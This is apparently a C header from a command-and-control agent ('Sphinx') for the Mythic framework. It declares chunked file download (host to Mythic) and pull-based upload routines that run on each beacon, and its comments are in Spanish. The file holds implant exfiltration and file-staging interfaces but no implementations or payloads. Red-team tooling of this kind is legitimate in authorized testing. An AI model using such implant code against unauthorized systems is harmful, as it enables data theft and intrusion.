#ifndef SPHINX_FILE_TRANSFER_H
#define SPHINX_FILE_TRANSFER_H

#include <stdint.h>
#include <stddef.h>

#define CHUNK_SIZE (512 * 1024)

/* Convencion de retorno: 0 = ok, -1 = error (salvo file_download_next /
   file_upload_pull_next que usan 1/0/-1 como documentan sus comentarios). */

/* ── DOWNLOAD (agente -> Mythic) ── */

/* Abre el fichero, calcula total_chunks, guarda estado interno y emite
   el bloque INIT 0x02 en buf. Devuelve 0 ok / -1 error. */
int  file_download_start(const char* task_uuid, const char* path,
                         uint8_t* buf, size_t buf_cap, size_t* out_len);

/* Almacena el file_id que Mythic devuelve tras el INIT.
   Devuelve 0 ok / -1 si no hay descarga en curso. */
int  file_download_set_file_id(const char* file_id);

/* Si hay descarga activa Y file_id recibido: lee el siguiente chunk y emite
   CONT 0x03 en buf. Devuelve:
     1  = chunk emitido (queda mas por enviar)
     0  = descarga completada (cerro el fichero, no emite bloque)
    -1  = error */
int  file_download_next(uint8_t* buf, size_t buf_cap, size_t* out_len);

/* 1 si hay descarga en curso. Lo usa main() cada beacon. */
int  file_download_active(void);

/* Cancela y libera cualquier descarga en curso (errores/unload). */
void file_download_reset(void);

/* ── UPLOAD (Mythic -> agente, pull-based) ── */

/* Crea el fichero destino y guarda el estado del pull (file_id, task_uuid).
   Devuelve 0 ok / -1 error. */
int  file_upload_begin(const char* path, const char* file_id, const char* task_uuid);

/* Append de un chunk recibido de la tarea upload_resp. Avanza el estado.
   Devuelve 0 ok / -1 error. */
int  file_upload_write(const uint8_t* data, uint32_t len);

/* Guarda el total de chunks que Mythic reporto al responder el primer pull.
   Devuelve 0 ok / -1 si no hay upload en curso. */
int  file_upload_set_total(uint32_t total_chunks);

/* Si hay upload activo y quedan chunks: emite el pull 0x04 del siguiente
   chunk en buf. Devuelve:
     1  = pull emitido (quedan mas chunks por pedir)
     0  = upload completado (no emite bloque)
    -1  = error */
int  file_upload_pull_next(uint8_t* buf, size_t buf_cap, size_t* out_len);

/* 1 si hay upload en curso. */
int  file_upload_active(void);

/* Cierra el fichero y limpia el estado de upload en curso. */
void file_upload_end(void);

#endif //SPHINX_FILE_TRANSFER_H
